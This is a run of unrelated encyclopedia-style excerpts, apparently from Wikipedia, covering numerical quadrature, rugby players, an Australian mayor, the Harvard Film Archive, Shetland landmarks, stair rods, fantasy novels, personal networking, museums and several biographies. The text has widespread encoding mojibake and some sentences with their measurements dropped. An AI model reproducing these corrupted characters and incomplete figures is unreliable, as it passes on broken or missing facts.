which has the form of the above quadrature rule, but whose value would be zero for a simple integrand (for example, if the integrand were a polynomial of the appropriate degree). See: * Richardson extrapolation (see also Romberg's method) * Null rules * Epsilon algorithm Subdivision logic \\"Local\\" adaptive quadrature makes the acceptable error for a given interval proportional to the length of that interval. This criterion can be difficult to satisfy if the integrands are badly behaved at only a few points, for example with a few step discontinuities. Alternatively, one could require only that the sum of the errors on each of the subintervals be less than the user's requirement. This would be \\"global\\" adaptive quadrature. Global adaptive quadrature can be more efficient (using fewer evaluations of the integrand) but is generally more complex to program and may require more working space to record information on the current set of intervals.

Weighing 75 kg and only 1.75m tall, he is one of the smaller professional rugby players. However, his electric pace and low centre of gravity enabled him to be the 2nd highest Premiership try scorer for the 2005-06 season; and top scorer in the 2006-07 season. His skills and leadership made him one of the best ever 7s players for his country. As well as representing the 7s side, he has played for the senior 15-a-side team, representing his nation at the 2007 and 2011 World Cups. Europe Lemi caught Bristol coach Richard Hill's eye in the 2005 Safari Sevens in Kenya and joined Bristol on a one-year deal. During the 2005-06 season, Lemi quickly impressed, scoring 8 tries in 12 appearances, and became a crowd favourite at the Memorial Stadium. He signed a two-year contract extension in spring 2006. Despite Bristol Rugby's relegation at the end of the 2008‚Äì09 season, Lemi still won The Sunday Times Try of the Season Award for the try he scored against Bath Rugby in the first game of the season. He was the joint second top try scorer in the 2008-09 Guinness Premiership season. Following Bristol's relegation, it was confirmed in April that Lemi would be leaving the club. He was initially linked with Llanelli Scarlets. However, in May, Lemi signed a contract with Wasps. In 2012, Lemi signed a contract with Worcester Warriors and was reunited with former coach Richard Hill. In 2014, Lemi was re-signed by Bristol, which would see him leave the Worcester Warriors at the end of the 2014 season and helped Bristol gain promotion the Aviva Premiership. In April 2018, Lemi was announced as leaving Bristol Rugby at the end of the 2017/18 campaign, during which Bristol were promoted to the Aviva Premiership.

Overview Cr. Tony Mooney was first elected as Mayor in 1989 when he succeeded Mike Reynolds. He achieved 80% two party preferred and 73.56% primary vote at the 2004 election. Mooney was serving his sixth successive term when he was resoundingly defeated in the 2008 election with only 35% of the vote. He and former Thuringowa Mayor Les Tyrell were forced to go head to head for the top position when Townsville and Thuringowa City Councils were amalgamated by the State Government. In 2008 he was appointed to the Board of Ergon Energy and in 2009 to the Board of Townsville Enterprise Limited. As an ALP candidate he made two attempts to win a parliamentary seat but both attempts were unsuccessful. The first was as the ALP candidate for the court ordered Queensland state Mundingburra by-election. He was endorsed as the ALP candidate in Mundingburra after the ALP Administrative Committee disendorsed the sitting member Ken Davies. Mooney was defeated in the by-election thanks in some part to Davies running as an independent. Mooney won 40.2% of the primary vote and 47.2% of the two party preferred vote while Davies won 4.1% of the primary vote but did not direct his preferences to Mooney. It has been noted that it was enough to cost Mooney victory at the by-election. Mooney's second attempt to win a parliamentary seat was in 2010 when he announced his candidacy for the Federal seat of Herbert, but he was defeated by Ewen Jones at the Federal election on 21 August 2010. Education Mooney received a scholarship to study at James Cook University in 1972 and completed a Honours Degree in Education- Arts.Cooper, Linda The Private Life of Tony Mooney CityLife Magazine August 2006 p18 He is a Fellow of the Australian Institute of Company Directors.

Dedicated to the collection, preservation and exhibition of film, the HFA houses a collection of over 25,000 films in addition to videos, photos, posters and other film ephemera from around the world and from almost every period in film history. The HFA cinematheque screens films weekly in its 188-seat theater. It also maintains a film conservation center near Central Square, Cambridge. Harvard Film Archive won the 2020 Webby Award for Cultural Institution in the category Web. History The archive was founded in 1979 by Robert Gardner, Vlada K. Petric and Stanley Cavell in Harvard's Department of Visual and Environmental Studies, with grants from the Henry Luce Foundation and the National Endowment for the Humanities. It opened on March 16, 1979 with a screening of Ernst Lubitsch‚Äôs silent film, Lady Windermere's Fan. The archive's first curator was Vlada K. Petric, who expanded the collection and established the year-round regular screenings. He retired in 1995 and in 1999 Bruce Jenkins assumed the post. In January 2005, Harvard Faculty of Arts and Sciences dean William C. Kirby announced that the archive would be absorbed by the Harvard College Library and managed by the Library of Fine Arts. This caused some concern within the Harvard community about the future of the archive and its programming. Jenkins resigned soon after the announcement. In September 2006 film scholar Haden Guest became the new director of the archive. He addressed worries that the archives' absorption in the Library would affect its public film screenings. Collection The collection spans the history of film-making from the silent film era to today, and includes Hollywood films, documentaries, animation, short films, B-movies and feature films from all over the world. It is the largest collection of 35mm film in New England. The collection grows by an average of 15 to 20 films a year and contains some rarities, such as some of the only prints in the United States of several films by Serbian director Dusan Makavejev. It also features a large collection of German cinema and the Bavarian Film Fund donates prints of any films that it finances. Film conservation The Archive's mission includes to conserve, restore, and exhibit the collection's prints. It prioritizes film-to-film preservation for archival stability, authenticity, and aesthetics. It may also perform film-to-digital transfers.

Esha Ness Lighthouse on the west coast, just south of Calder's Geo. It was designed by David Alan Stevenson and commissioned in 1929. The hamlet of Tangwick contains the Tangwick Haa Museum, which opened in the former Laird's house in 1987. Geography Esha Ness is on the west coast of Northmavine on the island of Mainland, Shetland. It lies to the northwest of St Magnus Bay, to the north of Papa Stour. There are several small settlements in the peninsula, including Stenness and Tangwick in the south, Braewick and Braehoulland in the east, and Ure near the north coast. The principal road running through the peninsula is the B9078 road which passes near Braewick and West Heogaland to the coast, ending at Stenness. Calder's Geo is a large geo that cuts into the western black volcanic cliffs of Esha Ness. To the north of the geo is a sea cave that has been measured at more than one and a half times the size of \\"Frozen Deep\\", a chamber in Reservoir Hole under Cheddar Gorge in Somerset, potentially making it the largest natural chamber in Britain. There are numerous blowholes in the vicinity, notably the Holes of Scraada in a cleft where the sea appears about 300 yards from the cliff line on the west coast. There are also a number of giant boulder fields along the cliffsides, with rocks deposited from the cliffs during storms, and various islands offshore from Esha Ness including Dore Holm, the Isle of Stenness, and the Skerry of Eshaness, a small island about 1,200 yards off the south coast. About two and a half miles from the small inlet of Hamna Voe is Ossa Skerry. Landmarks Esha Ness Lighthouse Broch of the Loch of Houlland Esha Ness Lighthouse on the west coast, just south of Calder's Geo, was designed by David Alan Stevenson and commissioned in 1929. The power of the Atlantic Ocean storms is displayed at the Grind o Da Navir, a large amphitheatre just north of the Eshaness lighthouse that opens out through a breach in the cliffs. Here, the waves have thrown rocks of up to high over above the sea. Cross Kirk Cemetery lies near the Loch of Breckon, with the graves of physician John Williamson (Johnnie Notions), with a stone of mixed Roman and Runic inscriptions, and the grave of Donald Robertson with epitaphs. Sae Breck Broch, partially excavated by Charles S. T. Calder in 1949, is about up a steep hill to the west of the cemetery, and contains the remains of a coast guard watchtower. About directly east of here is the site of Hogaland Broch. The Broch of Houlland is on a large promontory on the Loch of Houlland, which has three rows of defensive walls. Also of note is March Cairn, a Neolithic square cairn overlooking Muckla Water. Excavated by Calder in 1949, it is across and contains a cruciform chamber of about in height, supported by large stones. Two pottery sherds, two stone discs and a quartz tool were unearthed at the site. Muckla Water square cairn is about east-northeast of the site. The hamlet of Tangwick contains the Tangwick Haa Museum. The house belonged to the Cheyne family, who were the Lairds of Tangwick. The last Laird, John Cheyne VIII, died in 1840 and it was left to the caretaker. After a long period of neglect, functioning as a workshop, it was highlighted for restoration by the Shetland Amenity Trust in 1985 and opened as a museum in 1987.

(Such long but narrow strips of carpeting are known as carpet runners or stair runners or stair carpet). Traditionally, stair rods were used to hold a carpet runner in place on stairs, but with superior carpet installation techniques and more rigid safety standards today, stair rods serve primarily a decorative purpose. Stair rods are however still an integral part of many installation techniques. They hide dimples in the carpet runner caused by installation staples or nail heads and they are also often required to conceal a pattern mismatch when the carpet runner is cut during installation at each step where the tread meets the riser. Stair rods consists of a long bar, either solid core or tube (hollow core), and brackets used to hold the bar in place. The brackets are installed on either side the carpet runner directly on the wood of the step. The brackets hold the bar that lies across the carpet runner firmly in place. A decorative finial end is commonly attached or integrated into the ends of the bar or attached to the outside of the brackets to give a more decorative and less industrial look. Materials used in stair rods can be steel, iron, wood, aluminum, or brass. Today brass and brass-plated stair rods are generally considered to strike a perfect balance between strength, appearance, and value.

David McLaughlin was a merchant and civic leader in Muskegon, MI, where a school and street are named for him. Career Following his graduation, McLaughlin taught Latin at the University of Michigan, then transferred to the history department, where he taught American history until he was recruited in 1906 by University of Chicago president William Rainey Harper, teaching there until 1929. By 1903 McLaughlin was a respected historian. He was selected to be the first director of the Department of Historical Research at the newly created Carnegie Institution in Washington, D.C., a post he held for two years. In 1914 he was named president of the American Historical Association, becoming an advocate for historians giving guidance on world events, touring the United Kingdom in 1918 to support its efforts in World War I, lecturing on the causes that had led the United States into the war. His book America and Britain (1919) was a compilation of these lectures.

David Langford characterized the series as \\"968 pages of junk food for the mind.\\" Novels The books were originally published as series of six novels, from 1980 to 1982: *The Sundered Realm *The City in the Glacier *The Destiny Stone *The Fallen Ones *In the Shadow of Omizantrim *Demon of the Dark Ages Later, the novels were regrouped to form two trilogies, each sold as a single volume: the first three packaged as \\"The War of Powers part 1\\", and the last three forming \\"The War of Powers part 2: Istu Awakened\\". Plot summaries Set in the fantasy world of The Sundered Realm, the story concerns itself with the adventures of Fost Longstrider, a hard living warrior who makes a living as a courier and Princess Moriana Etuul, heir to the throne of the magical City in the Sky. The War of Powers part 1 Fost Longstrider is a courier commissioned to deliver a clay jar to the powerful mage Kest-i- mond. When he finds his client dead, Fost discovers that the jar contains the spirit of the long-dead philosopher Erimenes the Ethical, a man who once preached the value of total abstinence. Fourteen hundred years as a ghost have given him time to reflect, however, and he now preaches a philosophy of total hedonism and bloodlust. His value to Kest-i-mond is his knowledge of the whereabouts of the Amulet of Living Flame, a mystical talisman that will grant eternal life. Falling in with the beautiful Princess Moriana, who plans to use the amulet to overthrow her evil sister Synalon and reclaim her throne, Fost and Erimenes set out on a journey to recover the relic. Pursued by Moriana‚Äôs sadistic cousin Prince Rann, they finally come to the glacier-locked city of Athalau, site of the last great battle between the Star Demon Istu and Felarod the Mystic which took place ten thousand years before. Venturing inside the city they eventually discover a shining black and white jewel of incredible workmanship. Hung next to it is a plain stone talisman which the two ignore. Up until this point, Moriana and Fost have avoided the question of who will take the amulet, but the matter is resolved when Moriana stabs Fost through the heart as he reaches for it. Sobbing with grief, Moriana folds Fost's hands over the unremarkable stone, which he grasped in his death throes, and takes the black and white jewel before leaving the city in the company of Ziore, the ghost of an embittered nun who once followed Erimenes' teachings of denial. After some time, Fost regains consciousness. It seems that the unregarded stone on his chest is, in fact, the Amulet of Living Flame which has exhausted its final energies in reviving him. Fost learns from the abandoned Erimenes that Moriana has mistakenly taken the Destiny Stone, a jewel capable of altering its wearer's luck for good or ill. Despite her treachery, Fost realises that he still loves Moriana and he and Erimenes set off in pursuit to warn her of her mistake. Meanwhile, Moriana attempts to raise an army from the northern kingdoms to retake her city. At first her recruitment drive is unsuccessful, but Synalon soon changes their minds when she launches a war of conquest against the other city states of the Sundered Realm. The two sides clash in a titanic battle, but the Destiny Stone betrays Moriana, leading to her defeat. She is able to escape, and in desperation decides to contact the reptilian Fallen Ones, the original builders of the Sky City, with hopes of forming an alliance. The book ends as Fost arrives on the battlefield. He is too late to intercept the Princess, and the garbled last words of a dying soldier mislead him into thinking she has returned to the Sky City. He announces his decision to follow her. The War of Powers part 2 Synalon Etuul has begun her conquest of The Sundered Realm, and Moriana's first attempt to reclaim the City in the Sky has failed. With Fost working with the Sky City Resistance, Moriana attempts to enlist the aid of the Fallen Ones, the reptilian builders of the city who were overthrown several millennia before. Forming an alliance with the Fallen Ones, Moriana finally retakes the city but is betrayed at the last by the leader of the reptiles who uses his magic to free the demon Istu, who has been chained to the bedrock of the floating city since the War of Powers ten thousand years before. Now, with the Fallen Ones in control of the city and Istu released from his prison, they embark on a crusade to eliminate the human race. Forced into an uneasy alliance with Synalon and Prince Rann, Fost and Moriana rally humanity's survivors but are gradually forced back to the ancient city of Athalau. They form a plan to summon the World Spirit, as Felarod the Mystic did during the War of Powers, with the hope that this time they can destroy Istu utterly. With the help of Felarod's descendants, Moriana contacts the World Spirit but cannot control it. Synalon then steps forward, volunteering to focus the power that Moriana wields. Gaining access to the Sky City, Rann and Fost fight side by side to protect Synalon while she channels the World Spirit. After a titanic battle Synalon is able to destroy Istu, but is then killed when the city collides with a mountain and is destroyed. Just before the city's destruction Fost straps the mortally wounded Rann onto the back of his war eagle and escapes. With the Fallen Ones defeated, Fost and Moriana turn to rebuilding the reborn Athalau.

In other words, a personal network is a group of caring, dedicated people who are committed to maintain a relationship with a person in order to support a given set of activities. Having a strong personal network requires being connected to a network of resources for mutual development and growth. Personal networks can be understood by: *who knows you *what you know about them *what they know about you *what are you learning together *how you work at that Personal networks are intended to be mutually beneficial, extending the concept of teamwork beyond the immediate peer group. The term is usually encountered in the workplace, though it could apply equally to other pursuits outside work. Personal networking is the practice of developing and maintaining a personal network, which is usually undertaken over an extended period. Personal networking is often encouraged by large organizations, in the hope of improving productivity, and so a number of tools exist to support the maintenance of networks. Many of these tools are IT-based, and use Web 2.0 technologies. History of networking and business success In the second half of the twentieth century, U.S. advocates for workplace equity popularized the term and concept of networking as part of a larger social capital lexicon‚Äîwhich also includes terms such as glass ceiling, role model, mentoring, and gatekeeper‚Äîserving to identify and address the problems barring non-dominant groups from professional success. Mainstream business literature subsequently adopted the terms and concepts, promoting them as pathways to success for all career climbers. In 1970 these terms were not in the general American vocabulary; by the mid-1990s they had become part of everyday speech. Before the mid-twentieth century, what we call networking today was framed in the language of family and friendship. These close personal relationships provided a range of opportunities to preferred subsets of people, such as access to job opportunities, information, credit, and partnerships. Family networks and nepotism have proven particularly strong throughout history. However, other common bonds‚Äîfrom ethnicity and religion to school ties and club memberships‚Äîcan connect subsets of people as well. Of course people whom insiders consider undesirable have been barred from such networks, with important consequences. Those who tap into influential networks can be nurtured toward success. Those who are shut out from networks can lose hope of success. Numerous business heroes of the past‚Äîsuch as Benjamin Franklin, Andrew Carnegie, Henry Ford, and John D. Rockefeller‚Äîexploited networks to great effect. The business networks that seemed natural and transparent to these white men were a closed book to women and minorities for much of American history. Drawing on work from the social sciences, these outsider groups had to identify and then harness the mechanisms behind networking's power. A prominent early example of this process was the formation of corporate caucuses by black men at Xerox starting in 1969. Groups of black salesmen met regularly to share information about Xerox's culture and strategies for navigating it most effectively. Through confrontation and collaboration with a relatively accommodating upper management, the caucuses helped open opportunities for high-performing black employees. The popular and business press began using the terms \\"network\\" and \\"networking\\" in the mid-1970s in the context of businesswomen consciously pursuing this strategy. Authors encouraged female workers to recognize and exploit the informal workplace systems that provided advancement. They urged women to identify mentors, use social contacts, and build peer and authority networks. The push for networking drew on ideas and relationships from the era's feminist movement, and dictionaries of the time explicitly linked business networking to women's efforts to succeed in the workplace. Since the closing decades of the twentieth century, networking has become a pervasive term and concept in American society. People now invoke networking in relation to everything from business to child rearing to science. While ambitious careerists seek networks as an indispensable talisman, companies purposefully encourage networking among their employees to boost performance and gain competitive advantage. At the same time, Americans are forgetting the workplace activism that first illuminated the power of networking. Unfortunately, this loss of historical context can fuel a backlash against outsider groups who still seek to synthesize networks so they can access the same opportunities enjoyed by insiders.  Characteristics of networks  Broadly speaking, all networks have the following characteristics: * Purpose ‚Äì A network can be established for learning, mission, business, idea, and family or personal reasons. * Structure ‚Äì A network is a group of interlinked entities that form a cluster. Most social structures tend to be characterized by dense clusters of strong connections. * Style ‚Äì The place, space, pace and style of interaction of the networks give an understanding of the style of the networks. Namkee Park, Seungyoon Lee and Jang Hyun Kim examined the relations between personal network characteristics and Facebook use. According to their study, personal networks are investigated through several structural characteristics, which can be categorized into three major dimensions according to the level of analysis: # Dyadic tie attributes which include the characteristics of ego- alter ties such as duration, multiplexity, and proximity. Ego-alter tie attributes represent various dimensions of relationships between the focal person and their close contacts. First, tie duration refers to the length of time since the tie was originally initiated, which indicates the duration of relationships. Second, multiplexity includes a focal individual's degree of involvement in various types of interactions with network members. The third dimension is the physical proximity between ego and alter. Theories of proximity suggest that physical proximity between people affects their interaction and subsequently, their formation of network ties. # The characteristics of alter-alter ties including personal network density. When moving to ties at the alter-alter level, ego-network density, which refers to the extent to which one's alters are connected with each other, is an important dimension of personal networks. Dense personal network structure indicates close interpersonal contacts among alters, and consequently, is considered to promote the sharing of resources. On the other hand, loose connections, or structural holes in ego-networks, have been found to facilitate the flow of information and to provide advantages in searching and obtaining resources (e.g., getting a job). # The composition of alter attributes centered on the heterogeneity of alters in one's personal network. The heterogeneity of alters in one's personal network is associated with access to diverse resources and information It is expected, thus, that the heterogeneity attributes may enhance the focal actor's social activities Each of these characteristics represents unique aspects of individuals' network relationships.  Types of personal networks  Personal networks can be used for two main reasons: social and professional. In 2012, LinkedIn along with TNS conducted a survey of 6,000 social network users to understand the difference between personal social networks and personal professional networks. The \\"Mindset Divide\\" of users of these networks was compared as follows: # Emotions: ##Personal social networks: Nostalgia, fun, distraction. ##Personal professional networks: Achievement, success, aspiration. # Use: ##Personal social networks: Users are in a casual mindset often just passing time. They use social networks to socialize, stay in touch, be entertained and kill time. ##Personal professional networks: In this purposeful mindset, users invest time to improve themselves and their future. These networks are used to maintain professional identity, make useful contacts, search for opportunities and stay in touch. # Content: ##Personal professional networks: These provide information about career, brand updates and current affairs. # Professional development: ##Personal development networks: These provide access to those who can provide information, knowledge, advice, support, expertise, guidance, and concrete resources to learn and work effectively‚Äîthus those who support the continuing professional development.  Personal network management  Personal network management (PNM) is a crucial aspect of personal information management and can be understood as the practice of managing the links and connections for social and professional benefits. Some ways to do this would be: *being authentic and consistent *paying attention to status updates *following wisely *contributing *seeking to be worth knowing *appropriate tagging  Tools for personal network management  Although it is easy to build a network, the real challenge is maintaining and leveraging the connections. Information fragmentation makes it this even more challenging. Information fragmentation refers to the difficulty encountered in ensuring co- operation and keeping track of different personal information assets (e.g. Facebook, Twitter etc.) According to Dan Schawbel, there is a lot of value in a contact management system. It \\"allows you to keep organized and aware of which contacts you haven't spoken to in a while, and who works at companies that you either want to collaborate with, or work for\\". In many ways, a contact manager can incorporate new, innovative services to not only help users take a smarter approach to meeting new people but also transmit readily available information from social media profiles directly into that contact profile. Some of the apps that are available on mobile and desktop devices are Plaxo, Evernote Hello, Smartr, Tacts and Soocial.

He also covered flanker and second row, which made him a useful forward to have in the Wasps squad. Ward-Smith was born in Palmerston North but spent his early childhood in Cornwall in the United Kingdom. He moved back to his hometown with his family when he was 13. After attending both Awatapu College and Waiopehu College he studied at Massey University. Career  New Zealand  Ward-Smith has played for Manawatu under-19s and played all twelve provincial games for Manawatu in 1999. Ward-Smith was selected in the NPC XV for that year. He made two appearances representing the New Zealand Maori Colts, with the aim of achieving a Super Rugby contract with the Wellington Hurricanes. However Ward-Smith eventually pursued a Rugby Career in the UK due to having dual Nationality.  England  Ward-Smith travelled to the UK on a short term contract with Plymouth Albion. While playing rugby in a local cup tie in Devon he suffered an ankle ligament injury which ended thoughts of an immediate return to a contract in pro rugby back in New Zealand. As a result, Plymouth Albion gave Ward-Smith the offer of rugby in tier 4 of the English club game and in 2000-01 he was part of the all conquering Albion team under the tutelage of Graham Dawe that took the league title with a perfect record of 26 wins out of 26, with Ward-Smith finishing as joint top try scorer in the division with 20 tries. A second successive promotion followed at Albion during the 2001-02 season where the club finished second to Orrell with Ward- Smith again becoming top try scorer in the division, this time with 23 tries. Having helped Plymouth achieved stability in tier 2 in a spell in which he scored almost 100 tries, Ward-Smith caught the eye of Bristol, which he signed for the 2005-6 campaign and looked to make a huge impression in his first season in the Premiership. He was selected for England 'A' in his first season at Bristol, making his debut against Ireland A. In his second season at the club he was called up to the 30-man England training squad for the Autumn Internationals. He missed out on a place in the 2007 England World Cup squad due to a ruptured patella tendon after being part of the initial training squad. Dan was named in The Guinness Premiership Team of the Year for the 2006-2007 season as Bristol finished third. After a promising start to the 2007‚Äì08 season with Bristol he broke his hand and missed out on selection for the 2008 Six Nations squad. It was announced on 24 March 2009 that he had signed a 4-year deal with London Wasps. On 7 July 2009; Ward-Smith was selected for the England Saxons squad. He had been selected for the 2010 tour to the southern hemisphere. However he did not play in the Test Matches but made appearances in the 4 non test fixtures. Notably Dan featured against The Barbarians at Twickenham and was the first person of Maori heritage to play against NZ Maori when he appeared for England in Napier in a fixture that celebrated 100 years of NZ Maori Rugby.

Early years Mott was born in Rose Hill, Iowa. His parents were Mary E. (Tipton) and David Charles Mott, publishers of the weekly What Cheer, Iowa Patriot. The Mott family owned a print shop in Keokuk County. He was a practicing Quaker. When he was 10 his father began publishing the Audubon, Iowa Republican and he assisted in the typesetting. Education He did the first three years of his college education at Simpson College and then completed his bachelor's degree at the University of Chicago. Mott attended Columbia University starting in 1917, earning his M.A. in 1919. Carl Van Doren, mentioned in the Franklin section below, was teaching at Columbia during this time, and the two may have met then. Mott earned his PH. D. in 1928 from the University of Iowa while a professor there. Academic career Mott became professor of English at the University of Iowa in 1921, rising to associate professor and of journalism and director of the school of journalism in 1925. He continued at UI until he was appointed Dean of the University of Missouri (MU)'s School of Journalism in 1942.Frank Luther Mott Papers headnote, retrieved 8/16/2020. Mott may have coined the term photojournalism in 1924.Stroebel, Leslie D. and Richard D. Zakia. The Focal Encyclopedia of Photography. Boston: Focal Press, 1993. - This is greatly contested; others claim it was Clifton C. Edom, Henry Luce, or various other photojournalists. He was influential in the development of photojournalism education: the first photojournalism class was taught at UI during his tenure, and the first photojournalism program, directed by Clifton C. Edom, started at MU in 1943 upon his request. His textbook on American Journalism: A History of Newspapers in the United States through 250 years 1690 to 1940books.google.com (1941 and later revised editions covering through 1960) was the standard resource in courses on the history of journalism. Mott was a lifelong lover of magazines, his father having hoarded them in the house.Frank Luther Mott, \\"Unfinished Story; or, The Man in the Carrel\\" in A History of American Magazines: Volume V: Sketches of 21 Magazines 1905-1930 (Cambridge, MA: The Belknap Press of Harvard University Press, 1968), 331. This brief autobiographical sketch describes Mott's interest in magazines and the course of the series. Additional background information is contained in the introductions by Howard Mumford Jones and Mott's daughter, Mildred Mott Wedel. His monumental series, A History of American Magazines, started as PhD work at Columbia in the late 1920s. It was projected as six volumes. However, other projects, such as American Journalism, derailed his progress. Four volumes of American Magazines carried the history up to 1905. Mott died after starting work on Volume V: 1905‚Äì1930. Volume V does not extend the history past 1905; it includes 21 of a projected 36 sketches of individual magazines, intended as the supplementary material to the 1905-1930 history. It also includes an index for all five volumes. Presumably, Volume VI would have covered the history from 1931 to Mott's present-day, plus additional supplementary materials. Volumes II and III of A History of American Magazines (1938) won the 1939 Pulitzer Prize for History, and Volume 4 won the Bancroft Prize in 1958. Mott served as president of Kappa Tau Alpha in 1937‚Äì1939.

It consists of an open-air museum with historical buildings, and an indoor museum with both permanent and temporary exhibitions. ‚ÄúJamtli‚Äù literally means ‚Äúhillside of J√§mtland‚Äù in the local dialect. Since the 1980s, the museum has been working with living history in a project entitled Jamtli Historyland. This venture has contributed to make the museum one of the most popular tourist attractions in the region.Jamtli Historieland (Jamtland.se)  History  Main entrance to Jamtli Jamtli has its roots in the antiquarian association of J√§mtland, established in 1886. After years of preparations led by the County Governor‚Äôs wife Ellen Widen, the open-air museum was inaugurated in 1912, and Eric Festin was appointed as its first director. In the early years, the museum focused on collecting and exhibiting historical buildings and items, but also organized courses in folk dance, handicraft and music. The aim was to keep alive traditions that were sinking into oblivion in the wake of industrialisation. The ideological background for the project can be found in the National Romanticism that flourished in Europe in the 19th century. Since 1913, the museum edits the yearbook J√§mten.Jamtli Museum, √ñstersund, Sweden (Worklab ) In the late 1920s, construction of a proper museum was commenced. Until then, collections were exhibited in the historical buildings and on various other locations in town. The new museum was stylistically inspired by the castle architecture of the Vasa-era of the 16th century, and its grandeur testifies to the importance attributed to regional cultural heritage at the time. It opened to the public in 1930, with exhibitions of textiles and archaeological finds, ethnographic artefacts and art. The famous √ñverhogdal tapestries from the Viking era were the main attractions. During the 1930s, the archaeologist, feminist and County Governor‚Äôs wife Hanna Rydh played an important part in the development of the museum, taking special interest in traditional costumes of the region. In 1953, one began to arrange Wednesday dances in the open-air grounds. The dances became highly popular, and went on every summer until 1979. In the beginning, this event attracted a family audience, but over the years, it became more youth-oriented. This had unfortunate side effects. The grounds deteriorated, and at a certain stage, historical buildings had to be fenced off from the crowd with barbed wire. Towards the late 60s, the need for a thorough restoration of both buildings and activities was clearly visible. The ethnologist G√∂ran Rosander was appointed new director in 1967. He managed to attract more visitors to the museum with a steady flow of new exhibitions, and he also initiated various ethnological surveys in the region. In 1971, Sten Rentzhog succeeded Rosander. At the time, alternative learning methods and new thoughts on the museum‚Äôs role in society were spreading. Items and buildings should not be dead relics anymore; they were to be incorporated into the daily activities at the museum. At Jamtli, the new ideas sparked a vitalization. Since 1986, actors have moved into the historical buildings every summer, and recreated how people lived, worked and spoke in the past. Jamtli Historyland (Jamtli Historieland) has been the summer season‚Äôs main attraction, and has inspired a similar period of activities named Jamtli Winterland in February‚ÄìMarch. Jamtli today √ñverhogdal tapestries In 1990, construction of a new museum with modern facilities was begun. Five years later, the building opened to the public, with a series of new exhibitions showing the cultural history of J√§mtland-H√§rjedalen. The older building today houses offices, archives, a library, and one of the country‚Äôs largest collections of historical photography, as well as departments of archaeology and building preservation.Jamtli Historieland (√ñstersund Turist & Kongress) The museum exhibition hosts an interesting set of tapestries, the √ñverhogdal tapestries, showing a rich imagery of both Norse and Christian origin from the Viking Age. The mythical Great Lake Monster (Storsj√∂odjuret) has an exhibit of its own. In 2002, Henrik Zip Sane followed Rentzhog as director. Under his leadership, a stronger European perspective has been developed alongside the regional approach. Jamtli today takes part in a number of projects with partners from all over Europe. Jamtli has been awarded several prizes in recent years, including the Great Tourism Prize (Stora Turismpriset) in 2000 and the national Children‚Äôs Tourist Prize (Barnens Turistpris) in 2006.

Life Very little is known of the youth of Johannes P√§√§suke, the fourth of six children to a comfortably-off couple living in Tartu, Livonia, Russian Empire. Johannes's siblings were well educated, but all that is known about Johannes's own education is that he studied photography. On his own account, he started photography at fifteen, that is, in 1907, and it is likely that he contacted the Estonian National Museum (ERM) in 1912, having already taken photographs in various places in Estonia.Kaelep, 83-4. In 1913, P√§√§suke began a project for the ERM to document Estonia's lands, trades and architecture through photography and the collection of artifacts.

Volter, to the Estonian coast, from 10 June to 29 July 1913. The two traveled most of the way by foot, carrying the normal luggage and also cameras, a tripod, plates and so forth. Three hundred and seventeen photographs remain from this trip, many of Saaremaa and Muhu. P√§√§suke's work was highly appreciated by ERM, which opened an exhibition of the photographs on 2 August 1913.Kaelep 85-6. P√§√§suke is known to have taken more than 1,300 photographs on glass plates in this national ethnographic project, which also included two larger series, one made in 1908-13 across much of the south of the nation, and the other made in 1914 in Tartu.Kaelep 89. P√§√§suke was also the first Estonian to make a film. He made about 40 films in his career with 10 films still in existence ‚àí five newsreels, four documentaries, and one work of fiction, the political satire Karujaht P√§rnumaal (Bear Hunt in the P√§rnu County). In 1915, P√§√§suke was conscripted to serve as a second-rank infantryman in the reserve battalion of the Lithuanian Regiment of the Foot Guards; he was mobilized on 8 September and was in St Petersburg on 14 November. He managed to be recognized as a photographer, receiving a camera by the end of the month, and continued his photographic activities both in Russia proper and in Estonia.Kaelep 87-8. P√§√§suke died in a train accident in 1918 in Orsha, Belarus. Photography P√§√§suke is notable as an ethnophotographer, a supplier of photographic documentation to the Estonian National Museum (ENM) in Tartu. By 2003, the ENM had identified 1305 photographs and 723 glass negatives as his work, and suspected that more among the unidentified were also by him. The photographs are of buildings, people, and activities, taken on a 13√ó18 cm or other plate camera.Linnap 96.

He has published eighteen books - fourteen collections of poetry and four novels - notable for their originality and expansiveness and for surprising differences from title to title. His poetry has won major awards in Australia and the UK. His novel Waiting which was shortlisted for the 2017 Miles Franklin Literary Award - Australia's most prestigious literary prize - the 2017 Prime Minister's Award for Literature, and the 2016 Victorian Premier's Award for Literature. His new novel The Returns, published in late July, 2019 has received strong reviews and was a finalist in the 2020 Miles Franklin Award. Biography Growing up on a farm in Brunswick Junction in the South West region of Western Australia, Salom had an isolated childhood before boarding at Bunbury during his high school years. He went on to study agriculture at Muresk Agricultural College - now known as Muresk Institute. He then worked for two years as a research assistant on the Northam Research Station. While studying Agricultural Science at the University of Western Australia, he developed his passion for the arts, painting and singing in the university choir. Uninterested in his course, he left university, took various casual jobs, and started writing on a 1972 painting trip to New Zealand. On returning to Perth, he enrolled in Curtin University's Literature and Creative Writing course, one of the first of its kind in Australia. On graduating he took a job with the Public Service in his old area of agriculture. His first poetry collection was published by Fremantle Arts Centre Press in 1980. Since then there have been many poetry collections and two novels. Salom has won both national and international acclaim for his poetry. For most of these years he taught Creative Writing at Curtin and Murdoch University in Western Australia. Late in 1997 he moved with his family to Melbourne, Victoria. In the next years he lectured at Deakin University and finally at the University of Melbourne. In 2008 he resigned from lecturing and since then has been writing full-time. His writing is distinctive for its metaphoric richness and expansive vision. It is also hugely various from title to title; his creative restlessness extends not only to style but also to conceptual paradigms. Since his first collection, many of his books have depicted imagined worlds or explored conceptually contained sequences - books such as The Projectionist, Sky Poems, The Rome Air Naked, The Well Mouth and Keepers. Keepers is part of a trilogy which is extended through two more books, The Keeper of Fish and Keeping Carter, books ostensibly written by Alan Fish and MA Carter, respectively. These are heteronyms for Salom's recent work. Since the Keepers trilogy, Flying Island Books (Macao) published Salom's pocket book of poems, Between Yes and No, in English and Mandarin, translated by Chris Song Zijiang and Iris Fan Xing. And in 2015 Alterworld (published by Puncher & Wattmann) completes another trilogy - Sky Poems, The Well Mouth and Alterworld - of three imagined worlds in one set of covers. In 2016 his third novel Waiting was published. In the Weekend Australian reviewer Peter Pierce called it a \\"brilliant and unsettling novel.\\" He adds: \\"Philip Salom has unleashed Australia's oddest literary couple since the elderly twin brothers Arthur and Waldo Brown in Patrick White's The Solid Mandala (1966)\\". The book has received outstanding reviews and acclaim for its extraordinary characterisation and its striking prose style. Michael McGirr says: \\"Waiting is a tour de force of sustained and affectionate wit\\". Judges' comments are available on the 2017 Miles Franklin website and the 2017 Prime Minister's Awards website. Below are some quotes from these: 'Waiting is poignant, compassionate and droll; it is never maudlin nor idealised. 